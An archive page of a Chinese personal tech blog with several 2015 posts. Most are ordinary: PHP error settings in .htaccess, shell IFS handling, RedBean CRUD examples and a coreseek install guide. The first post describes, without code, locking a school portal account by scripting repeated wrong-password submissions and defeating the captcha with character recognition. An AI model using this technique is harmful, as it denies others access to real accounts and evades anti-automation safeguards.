<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  
  <title>第 8 页 | 博客</title>

  
  <meta name="author" content="403 Forbidden">
  

  

  

  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">

  

  <meta property="og:site_name" content="博客"/>

  
  <meta property="og:image" content="/favicon.ico"/>
  

  <link href="/favicon.ico" rel="icon">
  <link rel="alternate" href="/atom.xml" title="博客" type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
</head>


<body>
<div class="blog">
  <div class="content">

    <header>
  <div class="site-branding">
    <h1 class="site-title">
      <a href="/">博客</a>
    </h1>
    <p class="site-description"></p>
  </div>
  <nav class="site-navigation">
    <ul>
      
        <li><a href="/">主页</a></li>
      
        <li><a href="/archives">归档</a></li>
      
    </ul>
  </nav>
</header>

    <main class="site-main posts-loop">
    
  <article>

  
    
    <h3 class="article-title"><a href="/2015/05/07/感觉我又恶劣了一把。。/"><span>感觉我又恶劣了一把。。</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2015/05/07/感觉我又恶劣了一把。。/" rel="bookmark">
        <time class="entry-date published" datetime="2015-05-07T04:25:07.000Z">
          2015-05-07
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>以前研究学校的 WiFi，写过一篇文章：<a href="http://futa.ooo/1988.html">纯靠点小聪明搞定学校 WiFi 该死的 web 登陆</a>，然后利用这个。。。咳咳懂的。但最近遇到点事情需要收回账号，但给出账号时已经给出了所有权限，包括修改密码的，结果只能用点特殊手段，看图。<br><a href="/uploads/2015/05/QQ图片20150507200223.png"><img src="/uploads/2015/05/QQ图片20150507200223-169x300.png" alt="QQ图片20150507200223"></a><br>输错五次密码自动锁定五分钟。。这样的话，要永久锁定不就是件很简单的事情了？只要写个程序不断模拟提交错误密码就行，但是，这里却遇到个问题：验证码。网上搜了很多资料，发现一篇很有用的文章：<a href="http://www.geekso.com/Valite2/" target="_blank" rel="noopener">http://www.geekso.com/Valite2/</a> 修改了下字模，很顺利地认出了学校 Web Portal 弱智的验证码：<br><a href="/uploads/2015/05/QQ图片20150507201318-e1431000789257.jpg"><img src="/uploads/2015/05/QQ图片20150507201318-e1431000789257-169x300.jpg" alt="QQ图片20150507201318"></a><br>2333，写完以后扔在了一部小渣机里，结果居然不卡<br><a href="/uploads/2015/05/QQ图片20150507185259.jpg"><img src="/uploads/2015/05/QQ图片20150507185259-300x169.jpg" alt="QQ图片20150507185259"></a><br><a href="/uploads/2015/05/QQ图片20150507185322.jpg"><img src="/uploads/2015/05/QQ图片20150507185322-300x162.jpg" alt="QQ图片20150507185322"></a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    
      

    <span class="post-categories">
      <i class="icon-categories"></i>
        <a href="/categories/Web-开发/">Web 开发</a>
    </span>
    

    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2015/04/17/用.htaccess设置PHP错误显示(转)/"><span>用.htaccess设置PHP错误显示(转)</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2015/04/17/用.htaccess设置PHP错误显示(转)/" rel="bookmark">
        <time class="entry-date published" datetime="2015-04-17T06:37:32.000Z">
          2015-04-17
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>今天在网上看到使用.htaccess可以在某种程度上更改PHP的错误显示的设置，实际上相当于更改PHP.ini的参数，很是方便。将以下相应代码放到对应目录中的.htaccess文件，即可实现相应功能。</p>
<p>关闭错误显示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">php_flag display_startup_errors off</span><br><span class="line">php_flag display_errors off</span><br><span class="line">php_flag html_errors off</span><br><span class="line">php_value docref_root 0</span><br><span class="line">php_value docref_ext 0</span><br></pre></td></tr></table></figure></p>
<p>只显示PHP错误：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php_flag  display_errors        on</span><br><span class="line">php_flag  display_startup_errors on</span><br><span class="line">php_value error_reporting        2047</span><br></pre></td></tr></table></figure></p>
<p>其中，“2047”为要显示的错误的级别，详细表格如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1 E_ERROR</span><br><span class="line">2 E_WARNING</span><br><span class="line">4 E_PARSE</span><br><span class="line">8 E_NOTICE</span><br><span class="line">16 E_CORE_ERROR</span><br><span class="line">32 E_CORE_WARNING</span><br><span class="line">64 E_COMPILE_ERROR</span><br><span class="line">128 E_COMPILE_WARNING</span><br><span class="line">256 E_USER_ERROR</span><br><span class="line">512 E_USER_WARNING</span><br><span class="line">1024 E_USER_NOTICE</span><br><span class="line">2047 E_ALL</span><br><span class="line">2048 E_STRICT</span><br><span class="line">4096 E_RECOVERABLE_ERROR</span><br></pre></td></tr></table></figure></p>
<p>要把错误保存到日志文件中，可以这样设置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># enable PHP error logging</span><br><span class="line">php_flag  log_errors on</span><br><span class="line">php_value error_log  /home/path/public_html/domain/PHP_errors.log</span><br></pre></td></tr></table></figure></p>
<p>然后，可以设置不允许访问.log文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># prevent access to PHP error log</span><br><span class="line">&lt;Files PHP_errors.log&gt;</span><br><span class="line"> Order allow,deny</span><br><span class="line"> Deny from all</span><br><span class="line"> Satisfy All</span><br><span class="line">&lt;/Files&gt;</span><br></pre></td></tr></table></figure></p>
<p>设置错误日志的最大体积，以bytes为单位：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># general directive for</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> setting max error size</span><br><span class="line">log_errors_max_len integer</span><br></pre></td></tr></table></figure></p>
<p>综合上述，.htaccess的PHP错误显示设置汇总：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"># PHP error handling for production servers</span><br><span class="line"></span><br><span class="line"># disable display of startup errors</span><br><span class="line">php_flag display_startup_errors off</span><br><span class="line"></span><br><span class="line"># disable display of all other errors</span><br><span class="line">php_flag display_errors off</span><br><span class="line"></span><br><span class="line"># disable html markup of errors</span><br><span class="line">php_flag html_errors off</span><br><span class="line"></span><br><span class="line"># enable logging of errors</span><br><span class="line">php_flag log_errors on</span><br><span class="line"></span><br><span class="line"># disable ignoring of repeat errors</span><br><span class="line">php_flag ignore_repeated_errors off</span><br><span class="line"></span><br><span class="line"># disable ignoring of unique source errors</span><br><span class="line">php_flag ignore_repeated_source off</span><br><span class="line"></span><br><span class="line"># enable logging of php memory leaks</span><br><span class="line">php_flag report_memleaks on</span><br><span class="line"></span><br><span class="line"># preserve most recent error via php_errormsg</span><br><span class="line">php_flag track_errors on</span><br><span class="line"></span><br><span class="line"># disable formatting of error reference links</span><br><span class="line">php_value docref_root 0</span><br><span class="line"></span><br><span class="line"># disable formatting of error reference links</span><br><span class="line">php_value docref_ext 0</span><br><span class="line"></span><br><span class="line"># specify path to php error log</span><br><span class="line">php_value error_log /home/path/public_html/domain/PHP_errors.log</span><br><span class="line"></span><br><span class="line"># specify recording of all php errors</span><br><span class="line">php_value error_reporting 999999999</span><br><span class="line"></span><br><span class="line"># disable max error string length</span><br><span class="line">php_value log_errors_max_len 0</span><br><span class="line"></span><br><span class="line"># protect error log by preventing public access</span><br><span class="line">&lt;Files /home/path/public_html/domain/PHP_errors.log&gt;</span><br><span class="line"> Order allow,deny</span><br><span class="line"> Deny from all</span><br><span class="line"> Satisfy All</span><br><span class="line">&lt;/Files&gt;</span><br></pre></td></tr></table></figure></p>
<p>以下则是适合开发者应用的设置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># PHP error handling for</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> development servers</span><br><span class="line">php_flag display_startup_errors on</span><br><span class="line">php_flag display_errors on</span><br><span class="line">php_flag html_errors on</span><br><span class="line">php_flag log_errors on</span><br><span class="line">php_flag ignore_repeated_errors off</span><br><span class="line">php_flag ignore_repeated_source off</span><br><span class="line">php_flag report_memleaks on</span><br><span class="line">php_flag track_errors on</span><br><span class="line">php_value docref_root 0</span><br><span class="line">php_value docref_ext 0</span><br><span class="line">php_value error_log /home/path/public_html/domain/PHP_errors.log</span><br><span class="line">php_value error_reporting 999999999</span><br><span class="line">php_value log_errors_max_len 0</span><br><span class="line"></span><br><span class="line">&lt;Files /home/path/public_html/domain/PHP_errors.log&gt;</span><br><span class="line"> Order allow,deny</span><br><span class="line"> Deny from all</span><br><span class="line"> Satisfy All</span><br><span class="line">&lt;/Files&gt;</span><br></pre></td></tr></table></figure></p>
<p>本文大部分内容参考这篇文章：<a href="http://perishablepress.com/press/2007/12/17/how-to-enable-php-error-logging-via-htaccess/" target="_blank" rel="noopener">How to Enable PHP Error Logging via htaccess</a> ，大家有兴趣的话可以阅读英文原版。</p>
<p>转载自 <a href="http://blog.slogra.com/post-79.html" target="_blank" rel="noopener">http://blog.slogra.com/post-79.html</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    
      

    <span class="post-categories">
      <i class="icon-categories"></i>
        <a href="/categories/Web-开发/">Web 开发</a>
    </span>
    

    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2015/04/13/Shell中处理包含空格的文件名实例/"><span>Shell中处理包含空格的文件名实例</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2015/04/13/Shell中处理包含空格的文件名实例/" rel="bookmark">
        <time class="entry-date published" datetime="2015-04-13T04:24:29.000Z">
          2015-04-13
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>这篇文章主要介绍了Shell中处理包含空格的文件名实例,需要的朋友可以参考下</p>
<p>今天在处理文件时遇到个问题，当文件名包含空格时，for循环就出问题了。<br>例如，我在当前文件夹下建立3个文件名包含空格的文件：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">keakons-MacBook-Pro:test keakon$ touch "test 1"</span><br><span class="line">keakons-MacBook-Pro:test keakon$ touch "test 2"</span><br><span class="line">keakons-MacBook-Pro:test keakon$ touch "test 3"</span><br><span class="line">keakons-MacBook-Pro:test keakon$ ls</span><br><span class="line">test 1 test 2 test 3</span><br></pre></td></tr></table></figure></p>
<p>然后for循环输出文件名：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">keakons-MacBook-Pro:test keakon$ for file in `ls`;</span><br><span class="line"><span class="meta">&gt;</span> do echo $file;</span><br><span class="line"><span class="meta">&gt;</span> done</span><br><span class="line">test</span><br><span class="line">1</span><br><span class="line">test</span><br><span class="line">2</span><br><span class="line">test</span><br><span class="line">3</span><br></pre></td></tr></table></figure></p>
<p>可以看到，文件名被分开了。<br>复制操作也不行：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">keakons-MacBook-Pro:test keakon$ mkdir ../bak</span><br><span class="line">keakons-MacBook-Pro:test keakon$ for file in `ls`; do cp "$file" ../bak; done</span><br><span class="line">cp: bak is a directory (not copied).</span><br><span class="line">cp: test: No such file or directory</span><br><span class="line">cp: 1: No such file or directory</span><br><span class="line">cp: test: No such file or directory</span><br><span class="line">cp: 2: No such file or directory</span><br><span class="line">cp: test: No such file or directory</span><br><span class="line">cp: 3: No such file or directory</span><br></pre></td></tr></table></figure></p>
<p>要解决这个问题，当然就要从单词分隔符着手。而bash中使用的是$IFS（Internal Field Separator）这个变量，内容为” \n\t”：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">keakons-MacBook-Pro:test keakon$ echo $IFS  </span><br><span class="line"> keakons-MacBook-Pro:test keakon$ echo "$IFS" | od -t x1</span><br><span class="line">0000000    20  09  0a  0a                                                </span><br><span class="line">0000004</span><br><span class="line">keakons-MacBook-Pro:test keakon$ echo "" | od -t x1</span><br><span class="line">0000000    0a                                                            </span><br><span class="line">0000001</span><br></pre></td></tr></table></figure></p>
<p>然后把它改成”\n\b”，记得修改前先保存一下：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">keakons-MacBook-Pro:test keakon$ SAVEIFS=$IFS</span><br><span class="line">keakons-MacBook-Pro:test keakon$ IFS=$(echo -en "\n\b")</span><br></pre></td></tr></table></figure></p>
<p>现在再执行上述命令就正常了：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">keakons-MacBook-Pro:test keakon$ for file in `ls`; do echo $file; done</span><br><span class="line">test 1</span><br><span class="line">test 2</span><br><span class="line">test 3</span><br><span class="line">keakons-MacBook-Pro:test keakon$ for file in `ls`; do cp "$file" ../bak; done</span><br><span class="line">keakons-MacBook-Pro:test keakon$ ls ../bak</span><br><span class="line">test 1 test 2 test 3</span><br></pre></td></tr></table></figure></p>
<p>最后，别忘了恢复$IFS：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">keakons-MacBook-Pro:test keakon$ IFS=$SAVEIFS</span><br><span class="line">keakons-MacBook-Pro:test keakon$ echo "$IFS" | od -t x1</span><br><span class="line">0000000    20  09  0a  0a                                                </span><br><span class="line">0000004</span><br><span class="line">keakons-MacBook-Pro:test keakon$ IFS=$(echo -en " \n\t")</span><br><span class="line">keakons-MacBook-Pro:test keakon$ echo "$IFS" | od -t x1</span><br><span class="line">0000000    20  0a  09  0a                                                </span><br><span class="line">0000004</span><br></pre></td></tr></table></figure></p>
<p>转载自 <a href="http://www.jb51.net/article/49797.htm" target="_blank" rel="noopener">http://www.jb51.net/article/49797.htm</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    
      

    <span class="post-categories">
      <i class="icon-categories"></i>
        <a href="/categories/VPS-技术/">VPS 技术</a>
    </span>
    

    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2015/04/07/Redbean：入门(一) - 增删改查/"><span>Redbean：入门(一) - 增删改查</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2015/04/07/Redbean：入门(一) - 增删改查/" rel="bookmark">
        <time class="entry-date published" datetime="2015-04-07T07:05:30.000Z">
          2015-04-07
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">require_once</span> <span class="string">'rb.php'</span>;</span><br><span class="line">    $tableName = <span class="string">"link"</span>;</span><br><span class="line">    <span class="comment">//链接数据库</span></span><br><span class="line">    R::setup(<span class="string">"mysql:host=localhost;dbname=hwibs_model"</span>,<span class="string">"root"</span>,<span class="string">""</span>);</span><br><span class="line">    <span class="comment">//创建一个表（也可以指为实例化一个表）</span></span><br><span class="line">    $handler = R::dispense($tableName);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">#####################################   add #####################################</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*同上[同时实例化多个表]</span></span><br><span class="line"><span class="comment">        list($handler_1,$handler_2) = R::dispenseALL("test_1,test_2");</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">//对象方式给字段赋值</span></span><br><span class="line">    <span class="comment">//::注意，如果字段不存在，store方法过后，会自动添加对应的字段，并且自动根据字段值设置字段的对应字段类型</span></span><br><span class="line">    $handler-&gt;name = <span class="string">"haha"</span>;</span><br><span class="line">    $handler-&gt;url = <span class="string">"isxiugai"</span>;</span><br><span class="line">    $handler-&gt;plushtime = time() - <span class="number">5000</span>;</span><br><span class="line">    <span class="comment">//如果有下划线的字段名，则可以使用驼峰法命名，将自动转换为下划线</span></span><br><span class="line">    $handler-&gt;isMyName = <span class="keyword">false</span>;<span class="comment">// = is_my_name</span></span><br><span class="line">    <span class="comment">//执行,此静态方法会返回添加成功后的自增id值(单个)</span></span><br><span class="line">    $inser_id = R::store($handler);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#####################################   query ####################################</span></span><br><span class="line">    <span class="comment">//获取记录句柄(参数1为表名，参数2为id值),返回值为对象集合</span></span><br><span class="line">    <span class="comment">//如果id不存在，则返回0</span></span><br><span class="line">    <span class="comment">//注意，这个获取到的句柄，可以用于删除操作</span></span><br><span class="line">    $bean  = R::load($tableName,<span class="number">4</span>);<span class="comment">//获取单个</span></span><br><span class="line">    $beans = R::loadAll($tableName,<span class="keyword">array</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>));<span class="comment">//获取多个</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#####################################   update #####################################</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//1.注意，修改跟add的唯一区别就是id，如果id不为空，则为修改，否则则为添加!</span></span><br><span class="line">    <span class="comment">//2.如果id不存在的情况下，既不会添加，也不会修改！所以一般在修改前，需要事先用load进行判断是否存在</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">foreach</span> ($beans <span class="keyword">as</span> $k=&gt;$v)&#123;</span><br><span class="line">        $beans[$k]-&gt;url = rand(<span class="number">100</span>,<span class="number">5555</span>);<span class="comment">//测试[循环将每个记录对象中的url赋值一个随机数]</span></span><br><span class="line">    &#125;</span><br><span class="line">    R::storeAll($beans);<span class="comment">//执行修改</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">#####################################   delete #####################################</span></span><br><span class="line">    <span class="comment">//删除单个::成功或失败都是返回null</span></span><br><span class="line">    var_dump(R::trash(R::load($tableName,<span class="number">1</span>)));</span><br><span class="line">    <span class="comment">//删除多个::如果有不存在的，则会只删除存在的,成功或失败都是返回null</span></span><br><span class="line">    var_dump(R::trashAll(R::loadALL($tableName,<span class="keyword">array</span>(<span class="number">117</span>,<span class="number">118</span>))));</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">#####################################   other #####################################</span></span><br><span class="line">    <span class="comment">//清除表中所有数据::相当于truncate，因为会将自增指针重置</span></span><br><span class="line">    <span class="comment">//R::wipe($tableName);</span></span><br><span class="line">    <span class="comment">//删除数据库中所有的表,[无语的功能，要这个搞毛]</span></span><br><span class="line">    <span class="comment">//var_dump(R::nuke());</span></span><br><span class="line">    <span class="comment">//关闭链接</span></span><br><span class="line">    R::close();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>转载自 <a href="http://www.cnblogs.com/shibazi/archive/2014/08/02/3887246.html" target="_blank" rel="noopener">http://www.cnblogs.com/shibazi/archive/2014/08/02/3887246.html</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    
      

    <span class="post-categories">
      <i class="icon-categories"></i>
        <a href="/categories/Web-开发/">Web 开发</a>
    </span>
    

    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2015/03/20/搭建coreseek(sphinx+mmseg3)详细安装配置+php之sphinx扩展安装+php调用示例/"><span>搭建coreseek(sphinx+mmseg3)详细安装配置+php之sphinx扩展安装+php调用示例</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2015/03/20/搭建coreseek(sphinx+mmseg3)详细安装配置+php之sphinx扩展安装+php调用示例/" rel="bookmark">
        <time class="entry-date published" datetime="2015-03-20T05:32:49.000Z">
          2015-03-20
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>一个文档包含了安装、增量备份、扩展、api调用示例，省去了查找大量文章的时间。</p>
<p><strong>搭建coreseek(sphinx+mmseg3)安装<br>[第一步] 先安装mmseg3</strong><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cd /var/install</span><br><span class="line">wget http://www.coreseek.cn/uploads/csft/4.0/coreseek-4.1-beta.tar.gz</span><br><span class="line">tar zxvf coreseek-4.1-beta.tar.gz</span><br><span class="line"></span><br><span class="line">cd coreseek-4.1-beta</span><br><span class="line">cd mmseg-3.2.14</span><br><span class="line">./bootstrap</span><br><span class="line">./configure --prefix=/usr/local/mmseg3</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure></p>
<p>遇到的问题:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error: cannot find input file: src/Makefile.in</span><br></pre></td></tr></table></figure></p>
<p>或者遇到其他类似error错误时…</p>
<p>解决方案：<br>依次执行下面的命令，我运行’aclocal’时又出现了错误，解决方案请看下文描述<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">yum -y install libtool</span><br><span class="line"></span><br><span class="line">aclocal</span><br><span class="line">libtoolize --force</span><br><span class="line">automake --add-missing</span><br><span class="line">autoconf</span><br><span class="line">autoheader</span><br><span class="line">make clean</span><br></pre></td></tr></table></figure></p>
<p>安装好’libtool’继续从’aclocal’开始执行上面提到的一串命令，执行完后再运行最开始的安装流程即可。</p>
<p><strong>[第二步] 安装coreseek</strong><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>#安装coreseek</span><br><span class="line"><span class="meta">$</span> cd csft-3.2.14 或者 cd csft-4.0.1 或者 cd csft-4.1</span><br><span class="line"><span class="meta">$</span> sh buildconf.sh                                         #输出的warning信息可以忽略，如果出现error则需要解决</span><br><span class="line"><span class="meta">$</span> ./configure --prefix=/usr/local/coreseek  --without-unixodbc --with-mmseg --with-mmseg-includes=/usr/local/mmseg3/include/mmseg/ --with-mmseg-libs=/usr/local/mmseg3/lib/ --with-mysql</span><br><span class="line"><span class="meta">#</span>#如果提示mysql问题，可以查看MySQL数据源安装说明   http://www.coreseek.cn/product_install/install_on_bsd_linux/#mysql</span><br><span class="line"><span class="meta">$</span> make &amp;&amp; make install</span><br><span class="line"><span class="meta">$</span> cd ..</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>#命令行测试mmseg分词，coreseek搜索（需要预先设置好字符集为zh_CN.UTF-8，确保正确显示中文）</span><br><span class="line"><span class="meta">$</span> cd testpack</span><br><span class="line"><span class="meta">$</span> cat var/test/test.xml    #此时应该正确显示中文</span><br><span class="line"><span class="meta">$</span> /usr/local/mmseg3/bin/mmseg -d /usr/local/mmseg3/etc var/test/test.xml</span><br><span class="line"><span class="meta">$</span> /usr/local/coreseek/bin/indexer -c etc/csft.conf --all</span><br><span class="line"><span class="meta">$</span> /usr/local/coreseek/bin/search -c etc/csft.conf 网络搜索</span><br></pre></td></tr></table></figure></p>
<p>出现这个 xmlpipe2 support NOT compiled in. To use xmlpipe2, install missing XML libra  错误<br>执行以下命令：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install expat expat-devel</span><br></pre></td></tr></table></figure></p>
